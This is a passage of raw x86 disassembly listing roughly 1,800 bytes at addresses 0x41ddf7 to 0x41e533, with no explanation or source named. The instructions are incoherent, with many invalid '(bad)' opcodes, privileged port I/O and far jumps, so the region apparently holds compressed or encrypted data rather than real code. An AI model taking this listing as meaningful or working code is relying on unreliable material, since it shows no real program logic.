  41ddf7:	mov    ebx,0xc90d9daa
  41ddfc:	test   BYTE PTR [ebx+0x5c],ch
  41ddff:	adc    eax,0x569a13ab
  41de04:	mov    ebx,0xb89dcc1
  41de09:	std    
  41de0a:	add    eax,0xaa47bef7
  41de0f:	(bad)  
  41de10:	jbe    0x41de8e
  41de12:	sahf   
  41de13:	jecxz  0x41dda1
  41de15:	ins    DWORD PTR es:[edi],dx
  41de16:	fs stos DWORD PTR es:[edi],eax
  41de18:	and    BYTE PTR [eax],dh
  41de1a:	cmp    eax,0x85cf99ec
  41de1f:	mov    eax,0x193833
  41de24:	cli    
  41de25:	dec    ecx
  41de26:	xor    BYTE PTR [esi+0x6cdb85ff],0x6c
  41de2d:	cmc    
  41de2e:	iret   
  41de2f:	repnz and DWORD PTR [eax-0x72],ebp
  41de33:	jb     0x41de95
  41de35:	xor    al,0xad
  41de37:	or     al,0x69
  41de39:	xchg   esi,eax
  41de3a:	mov    bh,0xd7
  41de3c:	or     al,0x42
  41de3e:	sbb    DWORD PTR [ecx],edx
  41de40:	mov    ebx,0xb0de3e72
  41de45:	fadd   st,st(3)
  41de47:	fs aas 
  41de49:	cmp    ecx,ecx
  41de4b:	clc    
  41de4c:	inc    ebp
  41de4d:	or     al,0x27
  41de4f:	and    cl,al
  41de51:	and    DWORD PTR [eax+ebx*2-0x413c87ea],ebx
  41de58:	sar    DWORD PTR cs:[ecx-0x5c778e96],cl
  41de5f:	stos   DWORD PTR es:[edi],eax
  41de60:	(bad)  
  41de61:	lods   eax,DWORD PTR ds:[esi]
  41de62:	int3   
  41de63:	scas   eax,DWORD PTR es:[edi]
  41de64:	pop    edi
  41de65:	cmp    DWORD PTR [eax+edx*2-0xa],esp
  41de69:	push   edx
  41de6a:	dec    esi
  41de6b:	cli    
  41de6c:	inc    esi
  41de6d:	in     al,dx
  41de6e:	cli    
  41de6f:	push   0x413b2bd2
  41de74:	sbb    esi,DWORD PTR [eax+ebp*2+0x5e083f0d]
  41de7b:	stos   DWORD PTR es:[edi],eax
  41de7c:	mov    esi,DWORD PTR [ebx-0x42626b3d]
  41de82:	sub    DWORD PTR [eax+0x8],ebx
  41de85:	or     BYTE PTR [ebp+0x1a],al
  41de88:	jo     0x41de81
  41de8a:	or     al,BYTE PTR [edx+esi*4-0x5c]
  41de8e:	shl    esi,0xb6
  41de91:	push   0x48
  41de93:	adc    BYTE PTR [esi+0x6f],0x85
  41de97:	ret    0x49e0
  41de9a:	or     BYTE PTR [ecx-0x64186fdd],cl
  41dea0:	add    bh,BYTE PTR [eax]
  41dea2:	lahf   
  41dea3:	sbb    DWORD PTR [edi],esi
  41dea5:	mov    dl,0xc7
  41dea7:	clc    
  41dea8:	add    DWORD PTR [esi],0x9cbf055d
  41deae:	push   edi
  41deaf:	xchg   edx,eax
  41deb0:	outs   dx,DWORD PTR ds:[esi]
  41deb1:	or     al,0xaf
  41deb3:	pop    esp
  41deb4:	test   al,0xcc
  41deb6:	ins    DWORD PTR es:[edi],dx
  41deb7:	dec    esp
  41deb8:	imul   ecx,ecx,0xa2c589a0
  41debe:	(bad)  
  41debf:	(bad)  [edx+0x4b]
  41dec2:	jmp    0x41de8b
  41dec4:	enter  0x3669,0x55
  41dec8:	imul   BYTE PTR [ebx-0x19e09e46]
  41dece:	xchg   ecx,eax
  41decf:	rcr    DWORD PTR ds:[edx+0x429c5d88],1
  41ded6:	je     0x41df28
  41ded8:	pop    ds
  41ded9:	inc    esi
  41deda:	out    dx,eax
  41dedb:	lds    esi,FWORD PTR [ebp+0x76]
  41dede:	mov    ebp,0xb7fc5b19
  41dee3:	lods   eax,DWORD PTR ds:[esi]
  41dee4:	cmp    DWORD PTR [esi],eax
  41dee6:	pop    eax
  41dee7:	test   DWORD PTR [eax-0x3d57ae1c],0x90bae8b1
  41def1:	xor    al,0xfc
  41def3:	add    bl,bh
  41def5:	daa    
  41def6:	hlt    
  41def7:	scas   al,BYTE PTR es:[edi]
  41def8:	pop    esi
  41def9:	ss pop es
  41defb:	sub    eax,0xeae9edc1
  41df00:	mov    esp,ecx
  41df02:	adc    BYTE PTR [esi-0x1b94653b],ah
  41df08:	rcr    DWORD PTR [edi+edx*2-0xd],cl
  41df0c:	out    dx,eax
  41df0d:	jl     0x41dedc
  41df0f:	pop    esi
  41df10:	(bad)  
  41df11:	in     eax,dx
  41df12:	dec    esp
  41df13:	push   edx
  41df14:	or     al,0xd
  41df16:	es jmp 0x88ee:0x2e03db2f
  41df1e:	int3   
  41df1f:	lods   eax,DWORD PTR ds:[esi]
  41df20:	js     0x41dec8
  41df22:	popw   ss
  41df24:	(bad)  
  41df25:	(bad)
  41df28:	fnstsw WORD PTR [edx]
  41df2a:	scas   al,BYTE PTR es:[edi]
  41df2b:	and    al,0x49
  41df2d:	mov    ecx,0xc632e086
  41df32:	jnp    0x41df25
  41df34:	ins    DWORD PTR es:[edi],dx
  41df35:	pop    edi
  41df36:	daa    
  41df37:	jns    0x41def4
  41df39:	jb     0x41df38
  41df3b:	dec    edi
  41df3c:	ret    
  41df3d:	(bad)  
  41df3f:	fwait
  41df40:	lea    esp,[edi+0x7b]
  41df43:	mov    eax,ds:0x9166e5a8
  41df48:	or     al,0x80
  41df4a:	lods   eax,DWORD PTR ds:[esi]
  41df4b:	cli    
  41df4c:	(bad)  
  41df4d:	shl    bl,1
  41df4f:	enter  0xf8c4,0xe5
  41df53:	xor    ebp,DWORD PTR [edx-0x5231b70a]
  41df59:	add    al,0x2f
  41df5b:	loope  0x41dfd9
  41df5d:	and    edi,ebx
  41df5f:	loopne 0x41dfa1
  41df61:	inc    edx
  41df62:	xor    DWORD PTR [edx+esi*2-0x46deab6e],0x25e2a341
  41df6d:	rol    BYTE PTR [ebx-0x6f],cl
  41df70:	pop    esi
  41df71:	shr    DWORD PTR [eax-0x66a589c8],cl
  41df77:	mov    edi,0x176d1ca
  41df7c:	jge    0x41dfd2
  41df7e:	push   esp
  41df7f:	jns    0x41dfec
  41df81:	(bad)  
  41df82:	(bad)  
  41df83:	pop    ds
  41df84:	adc    DWORD PTR [eax-0x1e],ecx
  41df87:	inc    ebx
  41df88:	and    dl,al
  41df8a:	dec    edx
  41df8b:	mov    ch,0x4f
  41df8d:	sub    esi,DWORD PTR [ebx+ecx*4-0xc480a11]
  41df94:	mov    cl,0x6f
  41df96:	mov    esi,DWORD PTR [edx]
  41df98:	xchg   BYTE PTR [ebx],bl
  41df9a:	stos   BYTE PTR es:[edi],al
  41df9b:	cmp    DWORD PTR [ecx-0x11cc9d78],0xa4e76244
  41dfa5:	pop    ecx
  41dfa6:	pop    eax
  41dfa7:	mov    bh,BYTE PTR [esi+ebp*2+0x69]
  41dfab:	fdiv   QWORD PTR [eax]
  41dfad:	shl    ebx,1
  41dfaf:	fnstsw WORD PTR [edi+edx*8]
  41dfb2:	dec    ebx
  41dfb3:	leave  
  41dfb4:	mov    ds:0x2ff280ec,al
  41dfb9:	gs jmp 0x84fd4c5
  41dfbf:	add    dh,BYTE PTR [ebx+0x7d]
  41dfc2:	mov    cl,0x5f
  41dfc4:	mov    ecx,edx
  41dfc6:	mov    eax,0x1ebc3f1b
  41dfcb:	mov    dl,0xe8
  41dfcd:	xor    eax,0x6e1bb7b3
  41dfd2:	int    0xb9
  41dfd4:	jnp    0x41e011
  41dfd6:	outs   dx,DWORD PTR ds:[esi]
  41dfd7:	adc    esp,eax
  41dfd9:	add    al,0x60
  41dfdb:	lds    ebx,FWORD PTR ds:[ebp+0x69]
  41dfdf:	stos   BYTE PTR es:[edi],al
  41dfe0:	shl    DWORD PTR [ebp-0x3a],1
  41dfe3:	fcom   QWORD PTR [edx-0x44db303a]
  41dfe9:	jnp    0x41dfc3
  41dfeb:	xor    DWORD PTR [ebp-0x5c],0x3d
  41dfef:	and    cl,dh
  41dff1:	hlt    
  41dff2:	dec    esp
  41dff3:	and    al,0xeb
  41dff5:	ja     0x41e075
  41dff7:	add    dl,dl
  41dff9:	loope  0x41df82
  41dffb:	xor    dl,ah
  41dffd:	jecxz  0x41df90
  41dfff:	lods   eax,DWORD PTR ds:[esi]
  41e000:	add    al,0x1f
  41e002:	dec    eax
  41e003:	xlat   BYTE PTR ds:[ebx]
  41e004:	xchg   ecx,eax
  41e005:	les    eax,FWORD PTR [edx]
  41e007:	and    dl,ah
  41e009:	cli    
  41e00a:	mov    WORD PTR [edx+0x78fbb932],ds
  41e010:	xor    al,0x54
  41e012:	ror    DWORD PTR [edx],0x7c
  41e015:	add    al,0x8c
  41e017:	sbb    ch,BYTE PTR [edx+0x69aad594]
  41e01d:	xchg   BYTE PTR [ecx+0x2cdb53a9],dh
  41e023:	jle    0x41e09b
  41e025:	lods   al,BYTE PTR ds:[esi]
  41e026:	out    dx,eax
  41e027:	ins    DWORD PTR es:[edi],dx
  41e028:	cmp    eax,0x92cfb7
  41e02d:	std    
  41e02e:	push   edx
  41e02f:	cmp    ah,BYTE PTR [ebp+eax*1+0x6f]
  41e033:	cdq    
  41e034:	xchg   edx,eax
  41e035:	dec    esi
  41e036:	sbb    eax,0x14e88b74
  41e03b:	add    eax,0x8f056125
  41e040:	cmp    DWORD PTR ss:[edi-0x14727000],edx
  41e047:	jge    0x41e041
  41e049:	push   0x3862131e
  41e04e:	inc    ebp
  41e04f:	pop    eax
  41e050:	(bad)  
  41e051:	gs and eax,0x903df844
  41e057:	sbb    BYTE PTR [ebx+0x7],ch
  41e05a:	fisttp DWORD PTR [ebx]
  41e05c:	mov    dh,0x3e
  41e05e:	test   dl,ah
  41e060:	mov    eax,?
  41e062:	push   esp
  41e063:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e064:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e065:	addr16 sbb eax,ebx
  41e068:	in     eax,0xe6
  41e06a:	push   ss
  41e06b:	clc    
  41e06c:	and    al,0x5
  41e06e:	fdiv   QWORD PTR [ecx]
  41e070:	push   cs
  41e071:	inc    ebx
  41e072:	adc    dl,BYTE PTR [ebp+0x1a]
  41e075:	dec    esi
  41e076:	out    0x99,al
  41e078:	pushf  
  41e079:	test   al,0xcb
  41e07b:	mov    ebx,0xf48d9df3
  41e080:	sub    eax,0xafdbc3ef
  41e085:	imul   ecx,DWORD PTR [ebx+0x6d],0x954beac5
  41e08c:	lahf   
  41e08d:	inc    ebp
  41e08e:	push   edx
  41e08f:	xchg   esp,eax
  41e090:	dec    edi
  41e091:	out    dx,al
  41e092:	arpl   WORD PTR [esi],ax
  41e094:	mov    esi,0x85f99bcd
  41e099:	retf   0x1518
  41e09c:	inc    eax
  41e09d:	retf   
  41e09e:	sahf   
  41e09f:	jb     0x41e0f8
  41e0a1:	test   eax,0x55b70949
  41e0a6:	sub    cl,BYTE PTR [ebp-0x4b]
  41e0a9:	(bad)  
  41e0aa:	and    DWORD PTR ss:[ecx+0x4d1fcba9],ebx
  41e0b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e0b2:	pusha  
  41e0b3:	rol    BYTE PTR [edi+ebx*4-0x5bf5b710],cl
  41e0ba:	inc    edi
  41e0bb:	out    0x2e,al
  41e0bd:	loopne 0x41e066
  41e0bf:	mov    WORD PTR gs:[eax+eiz*1-0x5d],cs
  41e0c4:	aam    0xde
  41e0c6:	ds ja  0x41e072
  41e0c9:	mov    DWORD PTR [esp+esi*2+0x2eb1b14b],ecx
  41e0d0:	mov    ch,0xf8
  41e0d2:	jb     0x41e150
  41e0d4:	fist   WORD PTR [ebp+eax*2-0x2993ae5a]
  41e0db:	je     0x41e126
  41e0dd:	jp     0x41e0b5
  41e0df:	imul   BYTE PTR [ebx]
  41e0e1:	cmp    al,0x74
  41e0e3:	cmp    BYTE PTR [esi+0x8],0x55
  41e0e7:	add    ebx,DWORD PTR [ecx+0x42]
  41e0ea:	int3   
  41e0eb:	std    
  41e0ec:	mov    cl,0xcd
  41e0ee:	cmc    
  41e0ef:	add    al,0xce
  41e0f1:	(bad)  
  41e0f2:	fisttp QWORD PTR [esi-0x4846e5e0]
  41e0f8:	or     eax,DWORD PTR [edi]
  41e0fa:	ret    0x3c1e
  41e0fd:	xchg   esp,eax
  41e0fe:	scas   al,BYTE PTR es:[edi]
  41e0ff:	test   eax,0x70275af9
  41e104:	cmp    al,0x0
  41e106:	pop    edx
  41e107:	xchg   BYTE PTR [ecx+edi*2],ah
  41e10a:	jmp    0x7ece:0x5bbaac47
  41e111:	outs   dx,BYTE PTR ds:[esi]
  41e112:	adc    ah,0x1a
  41e115:	test   BYTE PTR [esi],dl
  41e117:	adc    esp,DWORD PTR [edi-0x55]
  41e11a:	pop    es
  41e11b:	fstp   DWORD PTR [edi-0x3c]
  41e11e:	xchg   esi,eax
  41e11f:	pop    ds
  41e120:	pop    edi
  41e121:	lods   al,BYTE PTR ds:[esi]
  41e122:	out    dx,al
  41e123:	aam    0xa4
  41e125:	loopne 0x41e14f
  41e127:	in     eax,0xc7
  41e129:	cli    
  41e12a:	ds dec esi
  41e12c:	pop    eax
  41e12d:	push   ebp
  41e12e:	sahf   
  41e12f:	mov    ah,0x52
  41e131:	and    ch,0xe6
  41e134:	or     DWORD PTR [edi-0x42],ebp
  41e137:	fdivr  QWORD PTR [ecx+0x66878f34]
  41e13d:	aaa    
  41e13e:	fwait
  41e13f:	mov    ds:0xe70d082f,al
  41e144:	push   esp
  41e145:	pop    ds
  41e146:	icebp  
  41e147:	add    eax,0x12257d5d
  41e14c:	jmp    0x31c9:0xb4c5d080
  41e153:	xchg   bl,al
  41e155:	mov    bl,BYTE PTR [ebp+0x91daae9]
  41e15b:	cmp    eax,0x9192ae64
  41e160:	enter  0x213c,0x6b
  41e164:	dec    esp
  41e165:	daa    
  41e166:	fst    DWORD PTR [ebp-0x52]
  41e169:	sub    ah,BYTE PTR [edi-0x1b]
  41e16c:	and    al,0x54
  41e16e:	popa   
  41e16f:	popa   
  41e170:	xchg   edi,eax
  41e171:	push   edi
  41e172:	inc    esp
  41e173:	in     eax,dx
  41e174:	stos   DWORD PTR es:[edi],eax
  41e175:	mov    ah,BYTE PTR [ecx+edi*1]
  41e178:	in     eax,0x94
  41e17a:	pop    ecx
  41e17b:	mov    ebp,0xeefdd147
  41e180:	ins    BYTE PTR es:[edi],dx
  41e181:	xchg   esi,eax
  41e182:	ins    DWORD PTR es:[edi],dx
  41e183:	scas   eax,DWORD PTR es:[edi]
  41e184:	mov    ebp,0xff04795
  41e189:	aam    0x10
  41e18b:	cmp    ah,BYTE PTR [edx-0x279434e6]
  41e191:	(bad)  [ecx]
  41e193:	test   BYTE PTR [edx*4-0x3c2d6e9b],bl
  41e19a:	sbb    BYTE PTR [edx-0x1f],dh
  41e19d:	or     DWORD PTR [eax],0xffffffeb
  41e1a0:	bound  esp,QWORD PTR [eax+0x4f145bbc]
  41e1a6:	push   0xffffffba
  41e1a8:	popf   
  41e1a9:	sub    eax,0xdf82c695
  41e1ae:	mov    DWORD PTR [ebp-0x5],edx
  41e1b1:	mov    WORD PTR [esi+0x4],es
  41e1b4:	in     al,dx
  41e1b5:	add    eax,0x35b3b846
  41e1ba:	out    dx,al
  41e1bb:	ss cli 
  41e1bd:	int    0xb1
  41e1bf:	popf   
  41e1c0:	jbe    0x41e22e
  41e1c2:	push   es
  41e1c3:	or     ebx,DWORD PTR [edx]
  41e1c5:	cmp    eax,0xc9a91fb2
  41e1ca:	sbb    al,0x26
  41e1cc:	jge    0x41e155
  41e1ce:	sbb    dh,ch
  41e1d0:	cwde   
  41e1d1:	lods   al,BYTE PTR ds:[esi]
  41e1d2:	ret    0x4ba4
  41e1d5:	popf   
  41e1d6:	xchg   ecx,eax
  41e1d7:	push   eax
  41e1d8:	jl     0x41e1f8
  41e1da:	std    
  41e1db:	aad    0x36
  41e1dd:	mov    al,ds:0x6a899415
  41e1e2:	test   al,0xc8
  41e1e4:	arpl   WORD PTR [edi],bp
  41e1e6:	inc    eax
  41e1e7:	cs addr16 dec edx
  41e1ea:	xor    al,0xf1
  41e1ec:	mov    BYTE PTR [edi],bl
  41e1ee:	mov    cl,0xcc
  41e1f0:	mov    fs,WORD PTR [edx+0x30]
  41e1f3:	call   0xfda0a2a4
  41e1f8:	add    edi,DWORD PTR ds:0xc31dcd06
  41e1fe:	mov    ebp,0xf8a6c3f0
  41e203:	add    edi,DWORD PTR [eax]
  41e205:	jp     0x41e1df
  41e207:	or     al,0x58
  41e209:	popf   
  41e20a:	adc    dl,bh
  41e20c:	push   esp
  41e20d:	or     al,0xe6
  41e20f:	out    0x8c,al
  41e211:	aas    
  41e212:	dec    ecx
  41e213:	lods   eax,DWORD PTR ds:[esi]
  41e214:	leave  
  41e215:	clc    
  41e216:	jne    0x41e294
  41e218:	rcl    ebx,0x47
  41e21b:	jbe    0x41e255
  41e21d:	nop
  41e21e:	lods   eax,DWORD PTR ds:[esi]
  41e21f:	add    al,0xd2
  41e221:	nop
  41e222:	dec    esi
  41e223:	sti    
  41e224:	sub    al,0x82
  41e226:	loopne 0x41e235
  41e228:	adc    al,0x3e
  41e22a:	es lahf 
  41e22c:	pop    es
  41e22d:	inc    ebx
  41e22e:	adc    al,0x77
  41e230:	adc    al,0x42
  41e232:	sub    DWORD PTR [eax+0x5aa467b6],ebp
  41e238:	in     eax,dx
  41e239:	in     al,0x12
  41e23b:	clc    
  41e23c:	add    DWORD PTR [edi-0x53dd0b4c],ebx
  41e242:	or     eax,esp
  41e244:	mov    di,0x2e52
  41e248:	jg     0x41e1db
  41e24a:	push   edx
  41e24b:	dec    ebp
  41e24c:	push   edi
  41e24d:	inc    esp
  41e24e:	push   esp
  41e24f:	xchg   esp,eax
  41e250:	les    edi,FWORD PTR [eax+0x310de7f3]
  41e256:	scas   al,BYTE PTR es:[edi]
  41e257:	js     0x41e1f1
  41e259:	push   ss
  41e25a:	inc    esi
  41e25b:	add    al,0xd2
  41e25d:	push   edi
  41e25e:	xor    eax,DWORD PTR [ebx-0x5e]
  41e261:	retf   
  41e262:	and    DWORD PTR [edx+0x6eedbb99],edx
  41e268:	gs and al,0x46
  41e26b:	jne    0x41e23b
  41e26d:	(bad)
  41e271:	sbb    BYTE PTR [esi-0x73],ch
  41e274:	cwde   
  41e275:	dec    esi
  41e276:	pushf  
  41e277:	push   esp
  41e278:	adc    eax,0x6a8f273b
  41e27d:	and    ax,0x6196
  41e281:	pop    ebp
  41e282:	bound  ebp,QWORD PTR [ecx+0x3e]
  41e285:	and    ecx,esi
  41e287:	adc    DWORD PTR [edx-0x35],edx
  41e28a:	dec    edi
  41e28b:	arpl   WORD PTR [ebp+ecx*2-0x33971b20],sp
  41e292:	lock sub BYTE PTR [esi-0x49b23153],ah
  41e299:	xchg   edi,eax
  41e29a:	cs int 0x7e
  41e29d:	(bad)  
  41e29e:	out    0x3b,al
  41e2a0:	js     0x41e2c9
  41e2a2:	mov    ebp,0x416b7d7d
  41e2a7:	xor    BYTE PTR [esi],ch
  41e2a9:	inc    esi
  41e2aa:	ficomp WORD PTR [edi-0x6e]
  41e2ad:	lahf   
  41e2ae:	sub    al,0xca
  41e2b0:	jp     0x41e303
  41e2b2:	imul   ebx,DWORD PTR [ecx],0xfffffff4
  41e2b5:	imul   ebp,DWORD PTR [edi+0x1a],0x3d4fd214
  41e2bc:	mov    ecx,0xc0263945
  41e2c1:	jne    0x41e32e
  41e2c3:	xor    BYTE PTR [ebp+0x8c788fe],0xcb
  41e2ca:	push   ebx
  41e2cb:	push   es
  41e2cc:	outs   dx,BYTE PTR ds:[esi]
  41e2cd:	jno    0x41e2e0
  41e2cf:	lods   eax,DWORD PTR ds:[esi]
  41e2d0:	and    al,0x48
  41e2d2:	addr16 add eax,0x4b2f44c5
  41e2d8:	addr16 push 0x2ec61e63
  41e2de:	loop   0x41e2bf
  41e2e0:	outs   dx,DWORD PTR ds:[esi]
  41e2e1:	jo     0x41e2e2
  41e2e3:	dec    ebp
  41e2e4:	(bad)  
  41e2e6:	adc    al,bh
  41e2e8:	das    
  41e2e9:	loope  0x41e295
  41e2eb:	ja     0x41e26e
  41e2ed:	inc    edi
  41e2ee:	push   0xffffffc4
  41e2f0:	xchg   ebx,eax
  41e2f1:	fdivr  st(1),st
  41e2f3:	mov    BYTE PTR [eax],al
  41e2f5:	xor    BYTE PTR [ecx],bl
  41e2f7:	and    bl,BYTE PTR [ebp+0x1392a348]
  41e2fd:	dec    edi
  41e2fe:	jb     0x41e286
  41e300:	jae    0x41e326
  41e302:	call   0x702018c3
  41e307:	int    0x8d
  41e309:	fcomp  DWORD PTR [ecx+0x0]
  41e30c:	push   0xc63d3fbd
  41e311:	xchg   esi,eax
  41e312:	sbb    DWORD PTR [ebx-0x8],ecx
  41e315:	cmovns edi,edi
  41e318:	mov    ch,0x81
  41e31a:	dec    esi
  41e31b:	sub    DWORD PTR [edi],eax
  41e31d:	sub    al,BYTE PTR [esi]
  41e31f:	fild   DWORD PTR [ecx-0x4ed6e461]
  41e325:	xor    ah,BYTE PTR ds:0x60bc87cc
  41e32b:	fsubr  QWORD PTR [eax]
  41e32d:	sbb    al,0x3e
  41e32f:	push   ss
  41e330:	(bad)  
  41e331:	cmp    eax,0x1b911948
  41e336:	dec    eax
  41e337:	cs jl  0x41e318
  41e33a:	(bad)  
  41e33b:	xchg   ecx,eax
  41e33c:	sbb    bh,cl
  41e33e:	repnz pushf 
  41e340:	xor    DWORD PTR [edi],ecx
  41e342:	mov    edx,0xd294510c
  41e347:	sbb    ch,BYTE PTR [esi-0x3d00bb7]
  41e34d:	sahf   
  41e34e:	ja     0x41e38d
  41e350:	sti    
  41e351:	and    edi,DWORD PTR [esi]
  41e353:	mov    dl,0x5e
  41e355:	cmp    bl,0x5a
  41e358:	in     al,0x9d
  41e35a:	mov    ebp,0x7e0d826b
  41e35f:	adc    edi,edx
  41e361:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e362:	leave  
  41e363:	dec    ecx
  41e364:	ret    0x7621
  41e367:	popa   
  41e368:	sub    edx,DWORD PTR [ebx]
  41e36a:	xor    DWORD PTR [edi+ebp*8+0x7056d247],esp
  41e371:	out    0xf2,al
  41e373:	pop    esi
  41e374:	jg     0x41e313
  41e376:	cmp    edi,DWORD PTR [ebx]
  41e378:	jp     0x41e3eb
  41e37a:	scas   eax,DWORD PTR es:[edi]
  41e37b:	push   ebp
  41e37c:	loopne 0x41e34f
  41e37e:	test   BYTE PTR [ebx],al
  41e380:	adc    dh,BYTE PTR [ecx-0xe]
  41e383:	(bad)  
  41e384:	pusha  
  41e385:	inc    DWORD PTR [esi-0x65532c5b]
  41e38b:	pop    esi
  41e38c:	rcl    al,1
  41e38e:	out    0xc,eax
  41e390:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e391:	int    0x77
  41e393:	mov    ebp,0x9be66daa
  41e398:	xlat   BYTE PTR ds:[bx]
  41e39a:	inc    ecx
  41e39b:	test   al,0xa7
  41e39d:	inc    edi
  41e39e:	xchg   DWORD PTR [eax],esp
  41e3a0:	lds    ebp,FWORD PTR [edx]
  41e3a2:	adc    al,0x9e
  41e3a4:	jnp    0x41e39f
  41e3a6:	cmp    eax,0x6af3bdd3
  41e3ab:	mov    eax,ds:0x948fa7f5
  41e3b0:	inc    ebx
  41e3b1:	xchg   esp,eax
  41e3b2:	lods   eax,DWORD PTR ds:[esi]
  41e3b3:	fidivr WORD PTR [ecx+0x3a]
  41e3b6:	add    DWORD PTR [ebx-0x19],edi
  41e3b9:	loopne 0x41e3da
  41e3bb:	add    BYTE PTR [esi-0x70],cl
  41e3be:	mov    dh,0x9c
  41e3c0:	inc    ebp
  41e3c1:	pusha  
  41e3c2:	mov    dl,0x79
  41e3c4:	leave  
  41e3c5:	or     BYTE PTR [ebx],ch
  41e3c7:	dec    edx
  41e3c8:	into   
  41e3c9:	or     al,BYTE PTR [ebp-0xa]
  41e3cc:	adc    eax,0x7302bac9
  41e3d1:	xchg   esi,eax
  41e3d2:	lahf   
  41e3d3:	dec    esp
  41e3d4:	add    bh,0x60
  41e3d7:	inc    ebx
  41e3d8:	xchg   edx,eax
  41e3d9:	sbb    DWORD PTR [edi+0x10],eax
  41e3dc:	jle    0x41e3d7
  41e3de:	xor    BYTE PTR [edx-0x6dab2f5c],al
  41e3e4:	stos   DWORD PTR es:[edi],eax
  41e3e5:	or     WORD PTR [esi+0x71b9c880],di
  41e3ec:	or     eax,DWORD PTR [eax+ebp*2+0x4013aa69]
  41e3f3:	fist   WORD PTR [eax-0x475fabf2]
  41e3f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e3fa:	das    
  41e3fb:	outs   dx,DWORD PTR ds:[esi]
  41e3fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e3fd:	(bad)  
  41e3fe:	cmp    eax,0xf3c361c1
  41e403:	or     edx,DWORD PTR [ecx+0x2b]
  41e406:	and    ebx,esp
  41e408:	mov    ds:0xc80dc0d2,eax
  41e40d:	retf   0xd22d
  41e410:	popa   
  41e411:	loop   0x41e39d
  41e413:	push   esi
  41e414:	pop    eax
  41e415:	jg     0x41e3c6
  41e417:	mov    esp,0xcd3e6c12
  41e41c:	outs   dx,BYTE PTR ds:[esi]
  41e41d:	test   BYTE PTR [edi],al
  41e41f:	stc    
  41e420:	outs   dx,BYTE PTR ds:[esi]
  41e421:	pusha  
  41e422:	stos   BYTE PTR es:[edi],al
  41e423:	sub    eax,0xa404bd07
  41e428:	adc    DWORD PTR [ecx],edx
  41e42a:	fwait
  41e42b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e42c:	enter  0x29b2,0xfa
  41e430:	popf   
  41e431:	fidivr DWORD PTR [edx+0x42e9fd14]
  41e437:	iret   
  41e438:	inc    ebp
  41e439:	scas   eax,DWORD PTR es:[edi]
  41e43a:	dec    eax
  41e43b:	mov    ecx,DWORD PTR [esi-0x1dbb726b]
  41e441:	jbe    0x41e4a8
  41e443:	pop    edi
  41e444:	and    ecx,edx
  41e446:	push   ecx
  41e447:	pop    edi
  41e448:	rcr    BYTE PTR [edi-0x1fdc352c],0x70
  41e44f:	scas   al,BYTE PTR es:[edi]
  41e450:	dec    esp
  41e451:	faddp  st(3),st
  41e453:	lahf   
  41e454:	push   0xffffffae
  41e456:	adc    al,0x5d
  41e458:	push   edi
  41e459:	sbb    esi,DWORD PTR ss:[ebx+0x1392e5e6]
  41e460:	pop    ecx
  41e461:	arpl   sp,cx
  41e463:	outs   dx,DWORD PTR ds:[esi]
  41e464:	aas    
  41e465:	push   ecx
  41e466:	jle    0x41e435
  41e468:	lock hlt 
  41e46a:	inc    ecx
  41e46b:	push   esp
  41e46c:	shl    BYTE PTR [edi+0x3e91b55e],1
  41e472:	and    ebp,DWORD PTR [edx+0x60]
  41e475:	call   0x91678c0d
  41e47a:	jecxz  0x41e4a2
  41e47c:	and    ecx,edx
  41e47e:	addr16 out 0xb5,eax
  41e481:	sahf   
  41e482:	push   edi
  41e483:	sbb    ebx,DWORD PTR [eax-0x19ec7c07]
  41e489:	repnz mov gs,WORD PTR [edx]
  41e48c:	lods   al,BYTE PTR ds:[esi]
  41e48d:	(bad)  
  41e48e:	repnz cmp al,0x24
  41e491:	js     0x41e49a
  41e493:	icebp  
  41e494:	fs dec esp
  41e496:	fsub   DWORD PTR [bx+di]
  41e499:	mov    esi,0xd1f1e37d
  41e49e:	mov    ebp,0xc3b5a159
  41e4a3:	pop    ebp
  41e4a4:	adc    BYTE PTR [ebp-0x6e],ch
  41e4a7:	out    dx,al
  41e4a8:	sub    DWORD PTR [ecx-0x3],0xffffff87
  41e4ac:	cwde   
  41e4ad:	jp     0x41e49a
  41e4af:	sub    ah,bh
  41e4b1:	mov    edi,0x73f6e641
  41e4b6:	inc    ebp
  41e4b7:	mov    edx,edi
  41e4b9:	(bad)  
  41e4ba:	mov    ch,0x60
  41e4bc:	mov    ch,ah
  41e4be:	in     eax,dx
  41e4bf:	sbb    eax,0x42dddc62
  41e4c4:	jae    0x41e45e
  41e4c6:	jbe    0x41e449
  41e4c8:	leave  
  41e4c9:	cmp    al,BYTE PTR [ebp+0x28]
  41e4cc:	shl    BYTE PTR [edx-0x376ae8fb],1
  41e4d2:	push   ds
  41e4d3:	jmp    0x58b56859
  41e4d8:	scas   al,BYTE PTR es:[edi]
  41e4d9:	sub    BYTE PTR [ebx-0x48],dl
  41e4dc:	pop    edi
  41e4dd:	aas    
  41e4de:	and    DWORD PTR [edi+0x10],esi
  41e4e1:	ror    esi,0xec
  41e4e4:	sbb    al,0x98
  41e4e6:	lea    edi,[esi-0x6cf3e01c]
  41e4ec:	ss push edi
  41e4ee:	jmp    0x41e4c6
  41e4f0:	ficomp WORD PTR [edi]
  41e4f2:	add    ecx,edi
  41e4f4:	sbb    esi,ecx
  41e4f6:	xchg   ebx,eax
  41e4f7:	popa   
  41e4f8:	test   edi,0x16d688a2
  41e4fe:	pop    esp
  41e4ff:	mov    ds:0xd93fdb85,eax
  41e504:	out    0x99,eax
  41e506:	mov    ch,0xdf
  41e508:	sub    edx,eax
  41e50a:	mov    WORD PTR ds:0xbc93efeb,es
  41e510:	and    BYTE PTR [ecx+0x21],0x96
  41e514:	ja     0x41e4d1
  41e516:	xchg   ebx,eax
  41e517:	dec    esp
  41e518:	cld    
  41e519:	or     DWORD PTR [edx-0x30],0xf325b6ce
  41e520:	sub    cl,al
  41e522:	inc    ecx
  41e523:	outs   dx,BYTE PTR ds:[esi]
  41e524:	pop    ebx
  41e525:	mov    edx,0x484a0644
  41e52a:	pop    ebp
  41e52b:	xchg   edx,eax
  41e52c:	popa   
  41e52d:	sbb    al,0x0
  41e52f:	or     DWORD PTR [edi+0x72],0xffffffe7
  41e533:	adc    BYTE PTR [eax],0xf3
